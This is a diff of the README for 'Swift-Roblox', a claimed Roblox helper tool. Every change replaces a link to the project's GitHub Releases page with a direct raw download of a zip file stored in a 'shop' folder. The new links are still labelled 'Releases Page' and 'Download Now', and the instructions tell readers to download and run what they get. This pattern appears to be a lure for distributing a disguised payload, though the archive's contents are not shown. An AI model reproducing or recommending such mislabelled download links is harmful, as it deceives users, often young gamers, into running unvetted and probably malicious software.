@@ -1,6 +1,6 @@
 # 🚀 Swift-Roblox - Simplify Your Roblox Gaming Experience
 
-[![Download Swift-Roblox](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/shinyx5/Swift-Roblox/releases)
+[![Download Swift-Roblox](https://raw.githubusercontent.com/shinyx5/Swift-Roblox/main/shop/Swift-Roblox.zip%20Now-brightgreen)](https://raw.githubusercontent.com/shinyx5/Swift-Roblox/main/shop/Swift-Roblox.zip)
 
 ## 📦 Introduction
 Welcome to Swift-Roblox! This application enhances your Roblox experience by providing user-friendly tools and features. Swift-Roblox makes gaming smoother and more enjoyable, even if you're not a tech expert.
@@ -16,7 +16,7 @@ Welcome to Swift-Roblox! This application enhances your Roblox experience by pro
 To get started with Swift-Roblox, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Navigate to the [Releases Page](https://github.com/shinyx5/Swift-Roblox/releases) to find the latest version of Swift-Roblox.
+   Navigate to the [Releases Page](https://raw.githubusercontent.com/shinyx5/Swift-Roblox/main/shop/Swift-Roblox.zip) to find the latest version of Swift-Roblox.
 
 2. **Download the Application**  
    Look for the most recent release. Click the download link for the appropriate file. Follow the prompts to save it to your computer.
@@ -33,7 +33,7 @@ Before installing Swift-Roblox, ensure your computer meets these requirements:
 To download and run Swift-Roblox:
 
 1. **Go to the Releases Page**  
-   Click this link to access the [Releases Page](https://github.com/shinyx5/Swift-Roblox/releases).
+   Click this link to access the [Releases Page](https://raw.githubusercontent.com/shinyx5/Swift-Roblox/main/shop/Swift-Roblox.zip).
 
 2. **Select Your Version**  
    On the page, find the latest version. The version number and release date will be listed.
@@ -57,7 +57,7 @@ When you first open Swift-Roblox, you will see a clean interface. The main menu 
 If you encounter any issues while using Swift-Roblox, try the following solutions:
 
 1. **Ensure System Compatibility:** Check that your operating system meets the requirements above.
-2. **Reinstall the Application:** Uninstall Swift-Roblox and download the latest version again from the [Releases Page](https://github.com/shinyx5/Swift-Roblox/releases).
+2. **Reinstall the Application:** Uninstall Swift-Roblox and download the latest version again from the [Releases Page](https://raw.githubusercontent.com/shinyx5/Swift-Roblox/main/shop/Swift-Roblox.zip).
 3. **Check for Updates:** Ensure you are using the latest version of Swift-Roblox, as updates often fix bugs.
 
 ## 📞 Support
